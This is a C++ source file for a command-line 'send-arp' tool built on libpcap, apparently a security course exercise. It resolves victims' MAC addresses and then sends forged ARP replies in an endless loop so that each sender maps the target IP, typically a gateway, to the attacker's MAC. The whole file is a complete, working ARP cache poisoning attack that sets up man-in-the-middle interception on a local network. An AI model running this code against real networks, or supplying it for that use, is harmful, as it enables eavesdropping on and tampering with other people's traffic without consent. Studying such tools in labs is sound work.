#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <string>
#include <vector>

#include <arpa/inet.h>
#include <net/if.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include "mac.h"
#include "ip.h"
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct Flow {
    Ip senderIp;
    Ip targetIp;
    Mac senderMac;
};

void usage() {
    printf("syntax: send-arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool getAttackerInfo(const char* dev, Mac& attackerMac, Ip& attackerIp) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return false;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFHWADDR)");
        close(sock);
        return false;
    }
    attackerMac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFADDR)");
        close(sock);
        return false;
    }
    attackerIp = Ip(std::string(inet_ntoa(reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr)->sin_addr)));

    close(sock);
    return true;
}

bool sendArpRequest(pcap_t* pcap, const Mac& attackerMac, const Ip& attackerIp, const Ip& queryIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = attackerMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = attackerMac;
    packet.arp_.sip_ = htonl(attackerIp);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(queryIp);

    return pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) == 0;
}

bool resolveSenderMac(pcap_t* pcap, const Mac& attackerMac, const Ip& attackerIp, const Ip& senderIp, Mac& senderMac) {
    for (int retry = 0; retry < 3; retry++) {
        if (!sendArpRequest(pcap, attackerMac, attackerIp, senderIp)) {
            return false;
        }

        time_t start = time(nullptr);
        while (time(nullptr) - start < 1) {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(pcap, &header, &packet);

            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;
            if (header->caplen < sizeof(EthArpPacket)) continue;

            EthArpPacket* arpPacket = (EthArpPacket*)packet;
            if (arpPacket->eth_.type() != EthHdr::Arp) continue;
            if (arpPacket->arp_.op() != ArpHdr::Reply) continue;

            if (arpPacket->arp_.sip() == senderIp &&
                arpPacket->arp_.tip() == attackerIp &&
                arpPacket->arp_.tmac() == attackerMac) {
                senderMac = arpPacket->arp_.smac();
                return true;
            }
        }
    }

    return false;
}

bool sendArpInfection(pcap_t* pcap, const Mac& attackerMac, const Mac& senderMac, const Ip& targetIp, const Ip& senderIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = senderMac;
    packet.eth_.smac_ = attackerMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attackerMac;
    packet.arp_.sip_ = htonl(targetIp);
    packet.arp_.tmac_ = senderMac;
    packet.arp_.tip_ = htonl(senderIp);

    return pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) == 0;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    Mac attackerMac;
    Ip attackerIp;
    if (!getAttackerInfo(dev, attackerMac, attackerIp)) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    printf("attacker mac: %s\n", std::string(attackerMac).c_str());
    printf("attacker ip : %s\n", std::string(attackerIp).c_str());

    std::vector<Flow> flows;
    for (int i = 2; i < argc; i += 2) {
        Flow flow;
        flow.senderIp = Ip(std::string(argv[i]));
        flow.targetIp = Ip(std::string(argv[i + 1]));

        if (!resolveSenderMac(pcap, attackerMac, attackerIp, flow.senderIp, flow.senderMac)) {
            fprintf(stderr, "failed to resolve sender mac: %s\n", argv[i]);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }

        printf("sender ip  : %s\n", std::string(flow.senderIp).c_str());
        printf("sender mac : %s\n", std::string(flow.senderMac).c_str());
        printf("target ip  : %s\n", std::string(flow.targetIp).c_str());
        flows.push_back(flow);
    }

    while (true) {
        for (size_t i = 0; i < flows.size(); i++) {
            for (int retry = 0; retry < 3; retry++) {
                if (!sendArpInfection(pcap, attackerMac, flows[i].senderMac, flows[i].targetIp, flows[i].senderIp)) {
                    fprintf(stderr, "failed to send arp infection packet to %s\n",
                            std::string(flows[i].senderIp).c_str());
                    break;
                }
                usleep(100000);
            }

            printf("infected sender %s to believe %s is at %s\n",
                   std::string(flows[i].senderIp).c_str(),
                   std::string(flows[i].targetIp).c_str(),
                   std::string(attackerMac).c_str());
        }
        sleep(2);
    }

    pcap_close(pcap);
    return EXIT_SUCCESS;
}
